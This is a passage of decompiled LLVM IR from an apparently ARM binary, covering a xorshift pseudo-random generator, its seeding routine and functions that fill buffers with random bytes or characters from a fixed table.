  uselistorder label %dec_label_pc_f8d8.dec_label_pc_f8d8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f8c0.dec_label_pc_f8c0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f73c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f718, { 2, 0, 1 }
}

define i32 @function_fe24() local_unnamed_addr {
dec_label_pc_fe24:
  %v2_fe30 = load i32, i32* @global_var_1e3e0.160, align 4
  %v2_fe34 = load i32, i32* @global_var_1e3ec.162, align 4
  store i32 ptrtoint (i32* @global_var_1e3e4.164 to i32), i32* @lr, align 4
  %v4_fe40 = mul i32 %v2_fe30, 2048
  %v5_fe40 = xor i32 %v4_fe40, %v2_fe30
  %v4_fe44 = udiv i32 %v2_fe34, 524288
  %v5_fe44 = xor i32 %v4_fe44, %v2_fe34
  %v2_fe48 = load i32, i32* @global_var_1e3e4.164, align 4
  %v2_fe4c = load i32, i32* @global_var_1e3e8.166, align 4
  %v2_fe50 = xor i32 %v5_fe44, %v5_fe40
  %v4_fe54 = udiv i32 %v5_fe40, 256
  %v5_fe54 = xor i32 %v2_fe50, %v4_fe54
  store i32 %v2_fe48, i32* @global_var_1e3e0.160, align 4
  store i32 %v2_fe4c, i32* @global_var_1e3e4.164, align 4
  store i32 %v2_fe34, i32* @global_var_1e3e8.166, align 4
  store i32 %v5_fe54, i32* @global_var_1e3ec.162, align 4
  ret i32 %v5_fe54

; uselistorder directives
  uselistorder i32 %v2_fe34, { 2, 1, 0 }
  uselistorder i32 %v2_fe30, { 1, 0 }
}

define i32 @function_fe7c(i32 %arg1) local_unnamed_addr {
dec_label_pc_fe7c:
  %stack_var_-12 = alloca i32, align 4
  %v3_fe7c = load i32, i32* @r4, align 4
  store i32 %v3_fe7c, i32* %stack_var_-12, align 4
  %v2_fe84 = call i32 @function_1316c(i32* null)
  store i32 %v2_fe84, i32* @global_var_1e3e0.160, align 4
  %v0_fe90 = call i32 @function_12ef4()
  store i32 %v0_fe90, i32* @r4, align 4
  %v0_fe98 = call i32 @function_12f20()
  %v0_fea0 = load i32, i32* @r4, align 4
  %v2_fea0 = xor i32 %v0_fea0, %v0_fe98
  store i32 %v2_fea0, i32* @r4, align 4
  store i32 %v2_fea0, i32* @global_var_1e3e4.164, align 4
  %v1_fea8 = call i32 @function_1347c(i32 %v0_fe98)
  %v2_feac = load i32, i32* @global_var_1e3e4.164, align 4
  %v2_feb8 = xor i32 %v2_feac, %v1_fea8
  store i32 %v2_feb8, i32* @global_var_1e3ec.162, align 4
  store i32 %v1_fea8, i32* @global_var_1e3e8.166, align 4
  %v2_fec4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_fec4, i32* @r4, align 4
  ret i32 %v1_fea8

; uselistorder directives
  uselistorder i32 %v1_fea8, { 1, 2, 0 }
  uselistorder i32 %v0_fe98, { 1, 0 }
  uselistorder i32 ()* @function_12f20, { 1, 2, 0 }
}

define i32 @function_fed8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_fed8:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-69 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_fed8 = load i32, i32* @r4, align 4
  store i32 %v3_fed8, i32* %stack_var_-36, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_15818.172 to i32), i32* @r1, align 4
  %v2_feec = ptrtoint i32* %stack_var_-69 to i32
  store i32 %v2_feec, i32* @r0, align 4
  store i32 33, i32* @r2, align 4
  %v4_fef4 = call i32 @function_134b0(i32 %v2_feec, i32 ptrtoint ([33 x i8]* @global_var_15818.172 to i32), i32 33)
  store i32 %v4_fef4, i32* %r0.global-to-local, align 4
  %v0_fef8 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_fef8 = icmp slt i32 %v0_fef8, 0
  store i1 %v1_fef8, i1* %cpsr_n.global-to-local, align 1
  %v2_fef8 = icmp eq i32 %v0_fef8, 0
  store i1 %v2_fef8, i1* %cpsr_z.global-to-local, align 1
  %tmp20 = icmp slt i32 %v0_fef8, 1
  br i1 %tmp20, label %dec_label_pc_ffe4, label %dec_label_pc_ff00

dec_label_pc_ff00:                                ; preds = %dec_label_pc_fed8
  store i32 ptrtoint (i32* @global_var_1e3ec.162 to i32), i32* %fp.global-to-local, align 4
  %v2_ff0c = load i32, i32* @global_var_1e3e8.166, align 4
  store i32 %v2_ff0c, i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e3e0.160 to i32), i32* %r3.global-to-local, align 4
  %v2_ff14 = load i32, i32* @global_var_1e3e4.164, align 4
  store i32 %v2_ff14, i32* %sl.global-to-local, align 4
  %v2_ff18 = load i32, i32* @global_var_1e3ec.162, align 4
  store i32 %v2_ff18, i32* %r6.global-to-local, align 4
  %v2_ff1c = load i32, i32* @global_var_1e3e0.160, align 4
  store i32 %v2_ff1c, i32* %ip.global-to-local, align 4
  %v0_ff20 = load i32, i32* @r4, align 4
  %v1_ff20 = add i32 %v0_ff20, 1
  store i32 %v1_ff20, i32* %r7.global-to-local, align 4
  %v2_ff2c = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_ff8c

dec_label_pc_ff28:                                ; preds = %dec_label_pc_ff8c
  %v1_ff28 = udiv i32 %v5_ff98, 8
  %v4_ff30 = urem i32 %v1_ff28, 32
  %v5_ff30 = add i32 %v4_ff30, %v2_ff2c
  store i32 %v5_ff30, i32* %r0.global-to-local, align 4
  %v3_ff34 = mul i32 %v5_ff98, 65536
  store i32 %v3_ff34, i32* %r2.global-to-local, align 4
  store i32 %v2_ff2c, i32* %r3.global-to-local, align 4
  %v3_ff3c = mul i32 %v5_ff98, 256
  store i32 %v3_ff3c, i32* %r1.global-to-local, align 4
  %tmp21 = udiv i32 %v5_ff98, 2048
  %v4_ff40 = urem i32 %tmp21, 32
  %v5_ff40 = add i32 %v4_ff40, %v2_ff2c
  store i32 %v5_ff40, i32* %ip.global-to-local, align 4
  %tmp22 = udiv i32 %v5_ff98, 524288
  %v4_ff44 = urem i32 %tmp22, 32
  %v5_ff44 = add i32 %v4_ff44, %v2_ff2c
  store i32 %v5_ff44, i32* @lr, align 4
  %v4_ff48 = udiv i32 %v2_ff94, 134217728
  %v5_ff48 = add i32 %v4_ff48, %v2_ff2c
  %v1_ff4c = add i32 %v5_ff40, -33
  %v2_ff4c = inttoptr i32 %v1_ff4c to i8*
  %v3_ff4c = load i8, i8* %v2_ff4c, align 1
  %v4_ff4c = zext i8 %v3_ff4c to i32
  store i32 %v4_ff4c, i32* %r2.global-to-local, align 4
  %v1_ff50 = add i32 %v5_ff30, -33
  %v2_ff50 = inttoptr i32 %v1_ff50 to i8*
  %v3_ff50 = load i8, i8* %v2_ff50, align 1
  %v4_ff50 = zext i8 %v3_ff50 to i32
  store i32 %v4_ff50, i32* %r3.global-to-local, align 4
  %v1_ff54 = add i32 %v5_ff44, -33
  %v2_ff54 = inttoptr i32 %v1_ff54 to i8*
  %v3_ff54 = load i8, i8* %v2_ff54, align 1
  %v4_ff54 = zext i8 %v3_ff54 to i32
  store i32 %v4_ff54, i32* %r1.global-to-local, align 4
  %v1_ff58 = add i32 %v5_ff48, -33
  %v2_ff58 = inttoptr i32 %v1_ff58 to i8*
  %v3_ff58 = load i8, i8* %v2_ff58, align 1
  %v4_ff58 = zext i8 %v3_ff58 to i32
  store i32 %v4_ff58, i32* %r0.global-to-local, align 4
  %v1_ff5c = add i32 %v0_ff5c, -4
  store i32 %v1_ff5c, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_ff60 = icmp slt i32 %v1_ff5c, 0
  store i1 %v1_ff60, i1* %cpsr_n.global-to-local, align 1
  %v2_ff60 = icmp eq i32 %v1_ff5c, 0
  store i1 %v2_ff60, i1* %cpsr_z.global-to-local, align 1
  %v3_ff64 = add i32 %v2_ff64, -1
  %v4_ff64 = inttoptr i32 %v3_ff64 to i8*
  store i8 %v3_ff50, i8* %v4_ff64, align 1
  %v0_ff68 = load i32, i32* %r2.global-to-local, align 4
  %v1_ff68 = trunc i32 %v0_ff68 to i8
  %v2_ff68 = load i32, i32* %r7.global-to-local, align 4
  %v3_ff68 = inttoptr i32 %v2_ff68 to i8*
  store i8 %v1_ff68, i8* %v3_ff68, align 1
  %v0_ff6c = load i32, i32* %r1.global-to-local, align 4
  %v1_ff6c = trunc i32 %v0_ff6c to i8
  %v2_ff6c = load i32, i32* %r7.global-to-local, align 4
  %v3_ff6c = add i32 %v2_ff6c, 1
  %v4_ff6c = inttoptr i32 %v3_ff6c to i8*
  store i8 %v1_ff6c, i8* %v4_ff6c, align 1
  %v0_ff70 = load i32, i32* %r0.global-to-local, align 4
  %v1_ff70 = trunc i32 %v0_ff70 to i8
  %v2_ff70 = load i32, i32* %r7.global-to-local, align 4
  %v3_ff70 = add i32 %v2_ff70, 2
  %v4_ff70 = inttoptr i32 %v3_ff70 to i8*
  store i8 %v1_ff70, i8* %v4_ff70, align 1
  %v0_ff74 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_ff74, i32* %ip.global-to-local, align 4
  %v0_ff78 = load i32, i32* %r7.global-to-local, align 4
  %v1_ff78 = add i32 %v0_ff78, 4
  store i32 %v1_ff78, i32* %r7.global-to-local, align 4
  %v0_ff7c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_ff7c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_ff7c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_ff7c = xor i1 %v1_ff7c, %v2_ff7c
  %v4_ff7c = or i1 %v0_ff7c, %v3_ff7c
  br i1 %v4_ff7c, label %dec_label_pc_ffc8, label %dec_label_pc_ff80

dec_label_pc_ff80:                                ; preds = %dec_label_pc_ffac, %dec_label_pc_ff28
  %v2_ff646 = phi i32 [ %v1_ffc0, %dec_label_pc_ffac ], [ %v1_ff78, %dec_label_pc_ff28 ]
  %v0_ff8c2 = phi i32 [ %v0_ffbc, %dec_label_pc_ffac ], [ %v0_ff74, %dec_label_pc_ff28 ]
  %v0_ff80 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_ff80, i32* %sl.global-to-local, align 4
  %v0_ff84 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_ff84, i32* %sb.global-to-local, align 4
  %v0_ff88 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_ff88, i32* %r6.global-to-local, align 4
  %v0_ff9c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_ff8c

dec_label_pc_ff8c:                                ; preds = %dec_label_pc_ff00, %dec_label_pc_ff80
  %v2_ff64 = phi i32 [ %v1_ff20, %dec_label_pc_ff00 ], [ %v2_ff646, %dec_label_pc_ff80 ]
  %v0_ff5c = phi i32 [ %v0_fef8, %dec_label_pc_ff00 ], [ %v0_ff9c.pre, %dec_label_pc_ff80 ]
  %v0_ff90 = phi i32 [ %v2_ff18, %dec_label_pc_ff00 ], [ %v0_ff88, %dec_label_pc_ff80 ]
  %v0_ff8c = phi i32 [ %v2_ff1c, %dec_label_pc_ff00 ], [ %v0_ff8c2, %dec_label_pc_ff80 ]
  %v4_ff8c = mul i32 %v0_ff8c, 2048
  %v5_ff8c = xor i32 %v4_ff8c, %v0_ff8c
  store i32 %v5_ff8c, i32* %r3.global-to-local, align 4
  %v4_ff90 = udiv i32 %v0_ff90, 524288
  %v5_ff90 = xor i32 %v4_ff90, %v0_ff90
  %v2_ff94 = xor i32 %v5_ff90, %v5_ff8c
  store i32 %v2_ff94, i32* %r2.global-to-local, align 4
  %v4_ff98 = udiv i32 %v5_ff8c, 256
  %v5_ff98 = xor i32 %v4_ff98, %v2_ff94
  store i32 %v5_ff98, i32* %r5.global-to-local, align 4
  %v1_ff9c = add i32 %v0_ff5c, -3
  %v2_ff9c = icmp ugt i32 %v0_ff5c, 2
  %v3_ff9c = sub i32 2, %v0_ff5c
  %v4_ff9c = and i32 %v3_ff9c, %v0_ff5c
  %v5_ff9c = icmp slt i32 %v4_ff9c, 0
  store i1 %v5_ff9c, i1* %cpsr_v.global-to-local, align 1
  %v6_ff9c = icmp slt i32 %v1_ff9c, 0
  store i1 %v6_ff9c, i1* %cpsr_n.global-to-local, align 1
  %v7_ff9c = icmp eq i32 %v0_ff5c, 3
  store i1 %v7_ff9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_ff98, i32* %r0.global-to-local, align 4
  store i32 33, i32* %r1.global-to-local, align 4
  %v2_ffa8 = xor i1 %v7_ff9c, true
  %v3_ffa8 = and i1 %v2_ff9c, %v2_ffa8
  br i1 %v3_ffa8, label %dec_label_pc_ff28, label %dec_label_pc_ffac

dec_label_pc_ffac:                                ; preds = %dec_label_pc_ff8c
  %v2_ffac = call i32 @function_12bf8(i32 %v5_ff98, i32 33)
  store i32 %v2_ffac, i32* %r0.global-to-local, align 4
  %v0_ffb0 = load i32, i32* %r8.global-to-local, align 4
  %v1_ffb0 = add i32 %v0_ffb0, -1
  store i32 %v1_ffb0, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_ffb4 = icmp slt i32 %v1_ffb0, 0
  store i1 %v1_ffb4, i1* %cpsr_n.global-to-local, align 1
  %v2_ffb4 = icmp eq i32 %v1_ffb0, 0
  store i1 %v2_ffb4, i1* %cpsr_z.global-to-local, align 1
  %v1_ffb8 = trunc i32 %v2_ffac to i8
  %v2_ffb8 = load i32, i32* %r7.global-to-local, align 4
  %v3_ffb8 = add i32 %v2_ffb8, -1
  %v4_ffb8 = inttoptr i32 %v3_ffb8 to i8*
  store i8 %v1_ffb8, i8* %v4_ffb8, align 1
  %v0_ffbc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_ffbc, i32* %ip.global-to-local, align 4
  %v0_ffc0 = load i32, i32* %r7.global-to-local, align 4
  %v1_ffc0 = add i32 %v0_ffc0, 1
  store i32 %v1_ffc0, i32* %r7.global-to-local, align 4
  %v0_ffc4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_ffc4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_ffc4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_ffc4 = xor i1 %v1_ffc4, %v2_ffc4
  %v4_ffc4 = or i1 %v0_ffc4, %v3_ffc4
  br i1 %v4_ffc4, label %dec_label_pc_ffc8, label %dec_label_pc_ff80

dec_label_pc_ffc8:                                ; preds = %dec_label_pc_ffac, %dec_label_pc_ff28
  store i32 ptrtoint (i32* @global_var_1e3e4.164 to i32), i32* %r3.global-to-local, align 4
  %v0_ffd0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_ffd0, i32* @global_var_1e3e8.166, align 4
  store i32 ptrtoint (i32* @global_var_1e3e0.160 to i32), i32* %ip.global-to-local, align 4
  %v0_ffd8 = load i32, i32* %r5.global-to-local, align 4
  %v1_ffd8 = load i32, i32* %fp.global-to-local, align 4
  %v2_ffd8 = inttoptr i32 %v1_ffd8 to i32*
  store i32 %v0_ffd8, i32* %v2_ffd8, align 4
  %v0_ffdc = load i32, i32* %sb.global-to-local, align 4
  %v1_ffdc = load i32, i32* %r3.global-to-local, align 4
  %v2_ffdc = inttoptr i32 %v1_ffdc to i32*
  store i32 %v0_ffdc, i32* %v2_ffdc, align 4
  %v0_ffe0 = load i32, i32* %sl.global-to-local, align 4
  %v1_ffe0 = load i32, i32* %ip.global-to-local, align 4
  %v2_ffe0 = inttoptr i32 %v1_ffe0 to i32*
  store i32 %v0_ffe0, i32* %v2_ffe0, align 4
  %v2_ffe8.pre = load i32, i32* %stack_var_-36, align 4
  %v29_ffe8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ffe4

dec_label_pc_ffe4:                                ; preds = %dec_label_pc_fed8, %dec_label_pc_ffc8
  %v29_ffe8 = phi i32 [ %v29_ffe8.pre, %dec_label_pc_ffc8 ], [ %v4_fef4, %dec_label_pc_fed8 ]
  %v2_ffe8 = phi i32 [ %v2_ffe8.pre, %dec_label_pc_ffc8 ], [ %v3_fed8, %dec_label_pc_fed8 ]
  store i32 %v2_ffe8, i32* @r4, align 4
  ret i32 %v29_ffe8

; uselistorder directives
  uselistorder i32 %v1_ffc0, { 1, 0 }
  uselistorder i32 %v0_ffbc, { 1, 0 }
  uselistorder i32 %v5_ff98, { 6, 5, 7, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_ff94, { 1, 2, 0 }
  uselistorder i32 %v0_ff8c, { 1, 0 }
  uselistorder i32 %v0_ff90, { 1, 0 }
  uselistorder i32 %v0_ff5c, { 2, 0, 5, 4, 3, 1 }
  uselistorder i32 %v2_ff2c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_fef8, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 4, 1, 2, 3, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 -33, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_ffe4, { 1, 0 }
  uselistorder label %dec_label_pc_ff8c, { 1, 0 }
}

define i32 @function_10000(i8* %arg1) local_unnamed_addr {
dec_label_pc_10000:
  %fp.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_10000 = load i32, i32* @r4, align 4
  store i32 %v3_10000, i32* %stack_var_-36, align 4
  %v9_10000 = load i32, i32* @r6, align 4
  %v12_10000 = load i32, i32* @r7, align 4
  %v15_10000 = load i32, i32* @r8, align 4
  %v18_10000 = load i32, i32* @sb, align 4
  %v21_10000 = load i32, i32* @sl, align 4
  %v24_10000 = load i32, i32* @fp, align 4
  %v0_10004 = load i32, i32* @r1, align 4
  store i32 %v0_10004, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_10004, 1
  br i1 %tmp20, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_10000
  store i32 %v3_10000, i32* @r4, align 4
  ret i32 %tmp

bb21:                                             ; preds = %dec_label_pc_10000
  store i32 ptrtoint (i32* @global_var_1e3ec.162 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e3e8.166 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e3e4.164 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e3e0.160 to i32), i32* %r8.global-to-local, align 4
  %v2_10020 = load i32, i32* @global_var_1e3ec.162, align 4
  store i32 %v2_10020, i32* @lr, align 4
  %v2_10024 = load i32, i32* @global_var_1e3e8.166, align 4
  store i32 %v2_10024, i32* %r7.global-to-local, align 4
  %v2_10028 = load i32, i32* @global_var_1e3e4.164, align 4
  store i32 %v2_10028, i32* %r6.global-to-local, align 4
  %v2_1002c = load i32, i32* @global_var_1e3e0.160, align 4
  br label %dec_label_pc_10058

dec_label_pc_10034:                               ; preds = %dec_label_pc_10084
  %v3_1008c = sdiv i32 %v5_10070, 256
  %v1_10034 = trunc i32 %v3_1008c to i8
  %v3_10034 = add i32 %v9_10078, 1
  %v4_10034 = inttoptr i32 %v3_10034 to i8*
  store i8 %v1_10034, i8* %v4_10034, align 1
  %v0_10038 = load i32, i32* %r3.global-to-local, align 4
  %v1_10038 = trunc i32 %v0_10038 to i8
  %v2_10038 = load i32, i32* %r5.global-to-local, align 4
  %v3_10038 = inttoptr i32 %v2_10038 to i8*
  store i8 %v1_10038, i8* %v3_10038, align 1
  %v0_1003c = load i32, i32* %r5.global-to-local, align 4
  %v1_1003c = add i32 %v0_1003c, 2
  store i32 %v1_1003c, i32* %r5.global-to-local, align 4
  %v0_10040.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10040

dec_label_pc_10040:                               ; preds = %.thread, %dec_label_pc_10034
  %v0_10040 = phi i32 [ %v9_1007c, %.thread ], [ %v0_10040.pre, %dec_label_pc_10034 ]
  %v2_100347 = phi i32 [ %v12_10078, %.thread ], [ %v1_1003c, %dec_label_pc_10034 ]
  %tmp22 = icmp slt i32 %v0_10040, 1
  br i1 %tmp22, label %dec_label_pc_100c0, label %dec_label_pc_1004c

dec_label_pc_1004c:                               ; preds = %dec_label_pc_10040
  %v0_10044 = load i32, i32* %r6.global-to-local, align 4
  %v0_1004c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1004c, i32* %r6.global-to-local, align 4
  %v0_10050 = load i32, i32* @lr, align 4
  store i32 %v0_10050, i32* %r7.global-to-local, align 4
  %v0_10054 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10054, i32* @lr, align 4
  br label %dec_label_pc_10058

dec_label_pc_10058:                               ; preds = %bb21, %dec_label_pc_1004c
  %v0_100a8 = phi i32 [ %v2_10028, %bb21 ], [ %v0_1004c, %dec_label_pc_1004c ]
  %v9_10078 = phi i32 [ %tmp, %bb21 ], [ %v2_100347, %dec_label_pc_1004c ]
  %v0_10090 = phi i32 [ %v0_10004, %bb21 ], [ %v0_10040, %dec_label_pc_1004c ]
  %v0_1009c = phi i32 [ %v2_10020, %bb21 ], [ %v0_10054, %dec_label_pc_1004c ]
  %v0_10098 = phi i32 [ %v2_1002c, %bb21 ], [ %v0_10044, %dec_label_pc_1004c ]
  %v4_10058 = mul i32 %v0_10098, 2048
  %v5_10058 = xor i32 %v4_10058, %v0_10098
  %v4_1005c = udiv i32 %v0_1009c, 524288
  %v5_1005c = xor i32 %v4_1005c, %v0_1009c
  %v2_10060 = xor i32 %v5_1005c, %v5_10058
  %v4_10070 = udiv i32 %v5_10058, 256
  %v5_10070 = xor i32 %v4_10070, %v2_10060
  store i32 %v5_10070, i32* %r3.global-to-local, align 4
  %v7_10078 = icmp sgt i32 %v0_10090, 3
  br i1 %v7_10078, label %.thread, label %dec_label_pc_10084

.thread:                                          ; preds = %dec_label_pc_10058
  %v10_10078 = inttoptr i32 %v9_10078 to i32*
  store i32 %v5_10070, i32* %v10_10078, align 4
  %v11_10078 = load i32, i32* %r5.global-to-local, align 4
  %v12_10078 = add i32 %v11_10078, 4
  store i32 %v12_10078, i32* %r5.global-to-local, align 4
  %v8_1007c = load i32, i32* %r4.global-to-local, align 4
  %v9_1007c = add i32 %v8_1007c, -4
  store i32 %v9_1007c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10040

dec_label_pc_10084:                               ; preds = %dec_label_pc_10058
  store i32 %v5_10070, i32* %r3.global-to-local, align 4
  %v7_10088 = icmp eq i32 %v0_10090, 1
  %v1_10090 = add i32 %v0_10090, -2
  store i32 %v1_10090, i32* %r4.global-to-local, align 4
  br i1 %v7_10088, label %dec_label_pc_10098, label %dec_label_pc_10034

dec_label_pc_10098:                               ; preds = %dec_label_pc_10084
  store i32 %v5_10070, i32* %r3.global-to-local, align 4
  %v1_100a8 = load i32, i32* %r8.global-to-local, align 4
  %v2_100a8 = inttoptr i32 %v1_100a8 to i32*
  store i32 %v0_100a8, i32* %v2_100a8, align 4
  %v0_100ac = load i32, i32* %r7.global-to-local, align 4
  %v1_100ac = load i32, i32* %sl.global-to-local, align 4
  %v2_100ac = inttoptr i32 %v1_100ac to i32*
  store i32 %v0_100ac, i32* %v2_100ac, align 4
  %v0_100b0 = load i32, i32* @lr, align 4
  %v1_100b0 = load i32, i32* %sb.global-to-local, align 4
  %v2_100b0 = inttoptr i32 %v1_100b0 to i32*
  store i32 %v0_100b0, i32* %v2_100b0, align 4
  %v0_100b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_100b4 = load i32, i32* %fp.global-to-local, align 4
  %v2_100b4 = inttoptr i32 %v1_100b4 to i32*
  store i32 %v0_100b4, i32* %v2_100b4, align 4
  %v0_100b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_100b8 = trunc i32 %v0_100b8 to i8
  %v2_100b8 = load i32, i32* %r5.global-to-local, align 4
  %v3_100b8 = inttoptr i32 %v2_100b8 to i8*
  store i8 %v1_100b8, i8* %v3_100b8, align 1
  %v2_100bc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_100bc, i32* @r4, align 4
  store i32 %v9_10000, i32* @r6, align 4
  store i32 %v12_10000, i32* @r7, align 4
  store i32 %v15_10000, i32* @r8, align 4
  store i32 %v18_10000, i32* @sb, align 4
  store i32 %v21_10000, i32* @sl, align 4
  store i32 %v24_10000, i32* @fp, align 4
  ret i32 %v5_10058

dec_label_pc_100c0:                               ; preds = %dec_label_pc_10040
  %v0_100c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_100c0 = load i32, i32* %fp.global-to-local, align 4
  %v2_100c0 = inttoptr i32 %v1_100c0 to i32*
  store i32 %v0_100c0, i32* %v2_100c0, align 4
  %v0_100c4 = load i32, i32* @lr, align 4
  %v1_100c4 = load i32, i32* %sb.global-to-local, align 4
  %v2_100c4 = inttoptr i32 %v1_100c4 to i32*
  store i32 %v0_100c4, i32* %v2_100c4, align 4
  %v0_100c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_100c8 = load i32, i32* %sl.global-to-local, align 4
  %v2_100c8 = inttoptr i32 %v1_100c8 to i32*
  store i32 %v0_100c8, i32* %v2_100c8, align 4
  %v0_100cc = load i32, i32* %r6.global-to-local, align 4
  %v1_100cc = load i32, i32* %r8.global-to-local, align 4
  %v2_100cc = inttoptr i32 %v1_100cc to i32*
  store i32 %v0_100cc, i32* %v2_100cc, align 4
  %v2_100d0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_100d0, i32* @r4, align 4
  store i32 %v9_10000, i32* @r6, align 4
  store i32 %v12_10000, i32* @r7, align 4
  store i32 %v15_10000, i32* @r8, align 4
  store i32 %v18_10000, i32* @sb, align 4
  store i32 %v21_10000, i32* @sl, align 4
  store i32 %v24_10000, i32* @fp, align 4
  ret i32 %v5_10058

; uselistorder directives
  uselistorder i32 %v9_1007c, { 1, 0 }
  uselistorder i32 %v12_10078, { 1, 0 }
  uselistorder i32 %v5_10070, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v5_10058, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10098, { 1, 0 }
  uselistorder i32 %v0_1009c, { 1, 0 }
  uselistorder i32 %v0_10040, { 1, 0 }
  uselistorder i32 %v24_10000, { 1, 0 }
  uselistorder i32 %v21_10000, { 1, 0 }
  uselistorder i32 %v18_10000, { 1, 0 }
  uselistorder i32 %v15_10000, { 1, 0 }
  uselistorder i32 %v12_10000, { 1, 0 }
  uselistorder i32 %v9_10000, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 5, 0, 3, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 5, 0, 1, 2, 4, 7, 6, 3 }
  uselistorder i32* @global_var_1e3e0.160, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1e3e4.164, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32* @global_var_1e3e8.166, { 3, 6, 1, 4, 2, 0, 5 }
  uselistorder i32* @global_var_1e3ec.162, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_10058, { 1, 0 }
}

define i32 @function_100e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_100e4:
  %v2_100e8 = load i32, i32* @global_var_1e890.182, align 4
  %v2_100f0 = call i32 @function_12f9c(i32 %v2_100e8, i32 9)
